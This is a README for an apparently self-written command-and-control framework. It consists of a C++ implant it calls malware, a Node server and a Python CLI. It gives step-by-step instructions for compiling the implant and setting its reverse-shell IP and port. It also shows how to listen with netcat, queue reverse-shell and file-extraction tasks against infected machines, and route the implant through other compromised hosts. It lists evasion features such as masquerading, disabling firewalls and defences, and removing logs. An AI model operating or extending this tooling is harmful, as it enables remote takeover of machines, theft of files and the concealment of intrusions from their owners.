# Command & Control

## Implant
```bash
cd client
```

### Dependency
You need to install the cpr library:
https://girishjoshi.io/post/using-cpr-for-making-http-requests-c++/ 

Possible issue:
```bash
./bin/prog: error while loading shared libraries: libcpr.so.1: cannot open shared object file: No such file or directory
```
https://stackoverflow.com/questions/480764/linux-error-while-loading-shared-libraries-cannot-open-shared-object-file-no-s

### Compile 
```bash
make
```

### Configuration


### Execution
```bash
make run
```

The malware will try to ping the server.

## Server
```bash
cd api
```

### Setup 
```bash
npm install
chmod +x setup.sh
./setup.sh
```

### Execution
```bash
just
```

## CLI

### Execution
```bash
python3 run.py
```

### First of all 

List all the implants to get their UID to address them:
```bash 
python3 run.py list-implants
```

### How to get a reverse shell
You can configure the implant with the IP and PORT that you want.
Go to client/src/config.hpp:
```cpp
#define RS_IP YOUR_IP
#define RS_PORT YOUR_PORT
```

On your machine, you need to listen for a connection with *nc*
```bash
nc -lvnp RS_IP RS_PORT
```

With the CLI add a reverse shell task to the implant you want to connect to:
```bash
python3 run.py add-tasks --uid UID_FROM_LIST_IMPLANTS --tasktype reverse_shell
```

For exemple: UID_FROM_LIST_IMPLANTS = e0d00d2e-4445-46cd-a76d-f71a70b88545

### How to extract files

First you need to configure the implant, go to client/src/config.hpp
Add to the variable *file_to_extract* the abolute paths of the files you want to get.
```cpp
21: static const std::array<const char*, NUMBER_OF_PATHS> file_to_extract({"/home/username/exemple", ...});
``` 

With the CLI add a reverse shell task to the implant you want to connect to:
```bash
python3 run.py add-tasks --uid UID_FROM_LIST_IMPLANTS --tasktype extract
```
The extracted files will be on the server in the files/ directory

### Routing and Beacon

To take advantage of the routing componant of this C2 you need to configure the implant with all the IP addresses that you want to try to connect in the hope that one of them is infected and connected to internet.  
Go to client/src/config.hpp: Add to the variable *routing* all the IPs
```cpp
19: static const std::array<const char*, NUMBER_OF_IPs> routing({"127.0.0.1", ...});
```

# Defence Evasion technics

- Masquerading 

## If executed as root 

- Disable firewall and defences
- Remove logs

# Author
Evan Clausse